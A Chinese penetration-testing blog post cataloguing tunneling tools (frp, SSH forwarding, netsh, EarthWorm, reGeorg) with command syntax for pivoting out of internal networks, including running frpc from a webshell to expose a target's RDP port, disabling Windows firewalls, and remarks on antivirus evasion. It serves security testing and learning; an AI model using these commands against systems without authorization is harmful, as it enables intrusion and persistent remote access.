<!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>内网渗透中常用的隧道工具 | Dayu | sCRiPt n00b</title>

  
  <meta name="author" content="大宇">
  

  
  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
  

  
  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="内网渗透中常用的隧道工具">

  <meta property="og:site_name" content="Dayu">

  
  <meta property="og:image" content="/favicon.ico">
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">Dayu</a>
    </h1>
    <p class="site-description">sCRiPt n00b</p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/archives">归档</a></li>
      
        <li><a href="/whoami">关于</a></li>
      
        <li><a href="/atom.xml">订阅</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>内网渗透中常用的隧道工具</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/pentest-common-tunnel.html" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-30T05:30:58.000Z">
          2018-12-30
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>tunnel</p>
<a id="more"></a>
<hr>
<h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><code>https://github.com/fatedier/frp/</code></p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
<li>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透</li>
<li>跨平台支持linux，win，mac</li>
<li>类似于ngrok，运维、开发人员经常使用它管理内网机器和调试程序，例如将内网的22，3389转发到公网，开发人员将本地web服务转发到公网调试，msf/rat远控的内网上线，可以代替前几年流行的”内网通”服务</li>
<li>优点：不需要免杀，支持加密传输</li>
</ul>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><ul>
<li><p>在有公网ip的vps上部署服务端，然后在目标的内网机器上运行客户端即可反连公网机器，根据配置把内网中的目的端口转发到公网的那台机器上。网上也有一些免费和收费frp服务，可以免去自己部署服务端。</p>
</li>
<li><p>简单示例：<br>服务端和客户端均支持配置文件ini运行和命令行运行，下面示例为命令行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端：./frps -p &lt;服务监听端口&gt; -t &lt;token&gt;</span><br><span class="line">客户端：./frpc tcp -s &lt;服务端ip&gt;:&lt;服务端端口&gt; -r &lt;在服务端监听的对应端口&gt; -i &lt;内网地址&gt; -l &lt;内网端口&gt; -t &lt;token&gt; --ue --uc</span><br></pre></td></tr></table></figure>
<p>–ue –uc 分别为加密和压缩(use_encryption &amp;&amp; use_compression)</p>
<p>例如通过webshell转发出该机器的3389端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你的机器：./frps -p 7890 -t woshitoken</span><br><span class="line">Webshell: frpc.exe tcp -s 1.1.1.1:7890 -r 9999 -i 127.0.0.1 -l 3389 -t woshitoken --ue --uc</span><br></pre></td></tr></table></figure>
<p>此时访问你机器的9999端口，即可访达目标机器的3389端口。</p>
</li>
<li><p>更多参数用法查看github项目。</p>
</li>
</ul>
<hr>
<h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
<li><p>SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发</p>
</li>
<li><p>优点：linux自带，传输加密，支持socks代理</p>
</li>
</ul>
<h4 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h4><h4 id="相关参数："><a href="#相关参数：" class="headerlink" title="相关参数："></a>相关参数：</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C ：压缩数据传输。</span><br><span class="line">-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。</span><br><span class="line">-N ：不执行脚本或命令，通常与-f连用。</span><br><span class="line">-g ：在-L/-R/-D参数中，允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接。</span><br><span class="line">-L ：本地转发</span><br><span class="line">-R ：远程转发</span><br><span class="line">-D ：动态转发，即socks代理</span><br></pre></td></tr></table></figure>
<h5 id="本地转发（本地建立监听）"><a href="#本地转发（本地建立监听）" class="headerlink" title="本地转发（本地建立监听）"></a>本地转发（本地建立监听）</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -L &lt;本地监听ip&gt;:&lt;本地端口&gt;:&lt;远程ip&gt;:&lt;远程端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;</span><br><span class="line">ssh -C -f -N -g -L 0.0.0.0:1234:192.168.1.100:3389 root@192.168.2.101 -p 22</span><br></pre></td></tr></table></figure>
<h5 id="远程转发（远端建立监听）"><a href="#远程转发（远端建立监听）" class="headerlink" title="远程转发（远端建立监听）"></a>远程转发（远端建立监听）</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -R &lt;远程ip&gt;:&lt;远程端口&gt;:&lt;本地ip&gt;:&lt;本地端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;</span><br><span class="line">ssh -C -f -N -g -R 0.0.0.0:1234:192.168.5.2:3389 root@192.168.2.101 -p 22</span><br></pre></td></tr></table></figure>
<p>  注：如果远端不能监听0.0.0.0，以下两个方法：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 需要修改 ssh 配置/etc/ssh/sshd_config</span><br><span class="line">   GatewayPorts 项写为 yes </span><br><span class="line">   重启ssh后即可监听0.0.0.0</span><br><span class="line"></span><br><span class="line">2. 使用rinetd把监听在127.0.0.1转发到0.0.0.0上</span><br></pre></td></tr></table></figure></p>
<h5 id="动态转发（socks）"><a href="#动态转发（socks）" class="headerlink" title="动态转发（socks）"></a>动态转发（socks）</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -D &lt;本地ip&gt;:&lt;本地端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;</span><br><span class="line">ssh -C -f -N -g -D 0.0.0.0:1080 root@192.168.2.101 -p 22</span><br></pre></td></tr></table></figure>
<p>  socks代理上本地的1080端口，即可访问192.168.2.101的内网环境</p>
<hr>
<h1 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h1><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><ul>
<li>netsh是Network Shell的缩写，是windows为我们提供的功能强大的网络配置命令行工具。</li>
<li>支持tcp，udp 正向端口转发和修改防火墙规则，没有反向转发的功能，不支持socks。</li>
<li>优点：win自带，支持ipv4和v6。</li>
</ul>
<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ul>
<li><p>在xp/2003下使用，要先安装ipv6，装完后需要重启机器才能生效</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="管理防火墙"><a href="#管理防火墙" class="headerlink" title="管理防火墙"></a>管理防火墙</h5><ul>
<li><p>对于xp/2003的操作命令不同与之后的系统，而且xp/2003的防火墙不区分出站入站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state 可查看防火墙的状态，从显示结果中可看到防火墙各功能模块的禁用及启用情况。</span><br><span class="line">netsh firewall set opmode disable 用来禁用系统防火墙</span><br><span class="line">netsh firewall set opmode enable 可启用防火墙。</span><br><span class="line"></span><br><span class="line">netsh firewall add portopening TCP &lt;端口号&gt; &quot;规则名称&quot;   允许xx端口出入站</span><br><span class="line">netsh firewall delete portopening TCP &lt;端口号&gt;          删除该条规则</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于 2003 以后的系统，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles 查看防火墙的状态</span><br><span class="line">netsh advfirewall set allprofiles state on 开启防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off 关闭防火墙</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;规则名称&quot; dir=in(in为入站,out为出站) action=allow(allow为放行，block为阻止) protocol=TCP localport=&lt;端口号&gt;     添加规则</span><br><span class="line">netsh advfirewall firewall delete rule name=&quot;规则名称&quot; dir=in protocol=TCP localport=&lt;端口号&gt;      删除规则</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all   查看所有已设置的转发规则</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=&lt;监听端口&gt; connectaddress=&lt;将要转发的ip&gt; connectport=&lt;将要转发的端口&gt;   添加转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=&lt;转发的端口&gt;   删除规则</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="ew（EarthWorm）"><a href="#ew（EarthWorm）" class="headerlink" title="ew（EarthWorm）"></a>ew（EarthWorm）</h1><h4 id="项目地址-1"><a href="#项目地址-1" class="headerlink" title="项目地址"></a>项目地址</h4><p><code>https://github.com/rootkiter/EarthWorm</code></p>
<p><code>https://github.com/rootkiter/EarthWorm/blob/master/server/download/ew.zip</code></p>
<h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><ul>
<li>支持正反向tcp端口转发，类似lcx（htran）</li>
<li>支持反向socks代理</li>
<li>缺点：流量不加密，需要免杀</li>
</ul>
<h4 id="用法简要说明"><a href="#用法简要说明" class="headerlink" title="用法简要说明"></a>用法简要说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-l 本地要监听的端口</span><br><span class="line">-f 要主动连接的ip</span><br><span class="line">-g 要主动连接的端口</span><br><span class="line">-d 要反弹到的ip</span><br><span class="line">-e 要反弹到的端口</span><br><span class="line">-s 工作模式</span><br><span class="line"></span><br><span class="line">工作模式支持如下：</span><br><span class="line">lcx_tran 正向tcp端口转发，监听在本地</span><br><span class="line">lcx_slave 反向tcp转发客户端</span><br><span class="line">lcx_listen 反向tcp服务端</span><br><span class="line">ssocksd 创建正向socks代理服务端，监听在本地，直接把当前环境socks代理出去</span><br><span class="line">rssocks 创建反向socks代理服务端</span><br><span class="line">rcsocks 反向socks代理客户端</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="reGeorg-amp-ABPTTS"><a href="#reGeorg-amp-ABPTTS" class="headerlink" title="reGeorg&amp;ABPTTS"></a>reGeorg&amp;ABPTTS</h1><h4 id="项目地址-2"><a href="#项目地址-2" class="headerlink" title="项目地址"></a>项目地址</h4><p><code>https://github.com/sensepost/reGeorg</code></p>
<p><code>https://github.com/nccgroup/ABPTTS</code></p>
<h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>两款针对Web应用程序的HTTP隧道，使用方法简单，详情查看github项目</p>
<hr>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Pentest/">Pentest</a>
    </span>
    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Pentest/">Pentest</a><a href="/tags/tunnel/">tunnel</a>
    </span>
    

    </div>

    
  </div>
</article>


    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    <br>
    
    &copy; 2019 大宇
    
  </p>
</footer>
    
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-135378097-1', 'auto');
    ga('send', 'pageview');

</script>

  </div>
</div>
</body>
</html>